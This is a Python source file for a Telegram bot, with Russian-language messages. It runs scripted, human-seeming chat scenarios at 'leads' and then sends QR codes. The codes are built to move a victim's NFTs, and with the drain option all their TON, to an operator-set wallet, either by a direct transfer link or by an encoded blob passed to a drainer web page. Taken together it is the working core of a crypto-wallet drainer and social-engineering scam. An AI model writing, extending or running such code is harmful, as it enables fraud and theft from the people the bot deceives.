import asyncio
import base64
import json
from pathlib import Path

from bot import db
from bot.config import SCEN_DIR, WEB_BASE
from bot.qr import link, nft_body, qr_png


def load(sid: str) -> dict | None:
    p = Path(SCEN_DIR) / f"{sid}.json"
    return json.loads(p.read_text("utf-8")) if p.exists() else None


def save(sid: str, sc: dict) -> None:
    (Path(SCEN_DIR) / f"{sid}.json").write_text(
        json.dumps(sc, ensure_ascii=False, indent=2), "utf-8")


def delete(sid: str) -> None:
    p = Path(SCEN_DIR) / f"{sid}.json"
    if p.exists():
        p.unlink()


def scenarios() -> list[dict]:
    out = []
    for p in sorted(Path(SCEN_DIR).glob("*.json")):
        try:
            out.append({"id": p.stem,
                        "title": json.loads(p.read_text("utf-8")).get("title", p.stem)})
        except Exception:
            continue
    return out


async def cfg_for(sc: dict | None = None) -> dict:
    s = {k: await db.get_setting(k, "") for k in
         ("wallet", "mode", "gas_ton", "drain_ton", "ton_cap",
          "nft_source", "max_nfts", "reserve", "delay")}
    cfg = {
        "wallet": s["wallet"], "mode": s["mode"] or "nft",
        "gas": float(s["gas_ton"] or 0.05),
        "drain_ton": s["drain_ton"] == "1",
        "ton_cap": float(s["ton_cap"] or 0),
        "nft_source": s["nft_source"] or "list",
        "nft_list": await db.get_json("nft_list"),
        "collections": await db.get_json("nft_collections"),
        "max_nfts": int(s["max_nfts"] or 20),
        "reserve": float(s["reserve"] or 0.08),
        "delay": float(s["delay"] or 1.0),
    }
    if sc and sc.get("overrides"):
        cfg.update(sc["overrides"])
    return cfg


def build_qr(cfg: dict) -> tuple[str, str]:
    """Возвращает (данные для QR, описание)."""
wallet, gas = cfg["wallet"], cfg["gas"]
    if not wallet:
        raise ValueError("Кошелёк не задан: /admin → Кошелёк")

    if cfg["mode"] == "plain":
        return link(wallet, gas), f"перевод {gas} TON"

    body = nft_body(wallet, wallet)

    if cfg["mode"] == "nft":
        if not cfg["nft_list"]:
            raise ValueError("Список пуст: /admin → Что снимать")
        item = cfg["nft_list"][0]
        return link(item["address"], gas, body), f"предмет: {item.get('name', '—')}"

    if not WEB_BASE:
        raise ValueError("WEB_BASE пуст в .env")

    blob = {"to": wallet, "gas": gas, "reserve": cfg["reserve"], "max": cfg["max_nfts"]}
    if cfg["drain_ton"]:
        blob["ton"] = cfg["ton_cap"] or "all"
    if cfg["nft_source"] == "all":
        blob["nfts"] = "all"
    elif cfg["nft_source"] == "list" and cfg["nft_list"]:
        blob["nfts"] = [i["address"] for i in cfg["nft_list"]]
    elif cfg["nft_source"] == "collections" and cfg["collections"]:
        blob["collections"] = [c["address"] for c in cfg["collections"]]

    enc = base64.urlsafe_b64encode(json.dumps(blob, ensure_ascii=False).encode()).decode()
    parts = []
    if blob.get("nfts"):
        parts.append("NFT: " + ("все" if blob["nfts"] == "all" else str(len(blob["nfts"]))))
    if blob.get("ton"):
        parts.append("TON: " + ("всё" if blob["ton"] == "all" else str(blob["ton"])))
    return f"{WEB_BASE}/?d={enc}", " | ".join(parts) or "пусто"


async def _send(bot, chat_id: int, sc: dict, i: int, cfg: dict) -> None:
    step, mult = sc["steps"][i], cfg["delay"]
    kind = step["type"]

    if kind == "typing":
        await bot.send_chat_action(chat_id, "typing")
        await asyncio.sleep(step.get("seconds", 3) * mult)
    elif kind == "text":
        await bot.send_chat_action(chat_id, "typing")
        await asyncio.sleep(min(len(step["text"]) / 22, 6) * mult)
        await bot.send_message(chat_id, step["text"])
    elif kind == "qr":
        data, _ = build_qr(cfg)
        await bot.send_chat_action(chat_id, "upload_photo")
        await asyncio.sleep(2 * mult)
        await bot.send_photo(chat_id, qr_png(data), caption=step.get("caption", ""))


async def _play(bot, chat_id: int, tg_id: int, sc: dict, start: int, cfg: dict) -> None:
    i = start
    while i < len(sc["steps"]):
        await _send(bot, chat_id, sc, i, cfg)
        i += 1
        await db.set_step(tg_id, i)
        if sc["steps"][i - 1].get("wait"):
            await db.set_waiting(tg_id, 1)
            return
    await db.set_waiting(tg_id, 0)


async def run(bot, chat_id: int, tg_id: int, username: str, sid: str) -> str:
    sc = load(sid)
    if not sc:
        return "Сценарий не найден"
    cfg = await cfg_for(sc)
    try:
        build_qr(cfg)
    except ValueError as e:
        return str(e)
    await db.start_lead(tg_id, chat_id, username, sid)
    await db.add_event(tg_id, "start", sid)
    await _play(bot, chat_id, tg_id, sc, 0, cfg)
    return ""


async def resume(bot, chat_id: int, tg_id: int) -> None:
    lead = await db.get_lead(tg_id)
    if not lead or not lead[5]:
        return
    sc = load(lead[3])
    if not sc:
        return
    await db.set_waiting(tg_id, 0)
    await _play(bot, chat_id, tg_id, sc, lead[4], await cfg_for(sc))

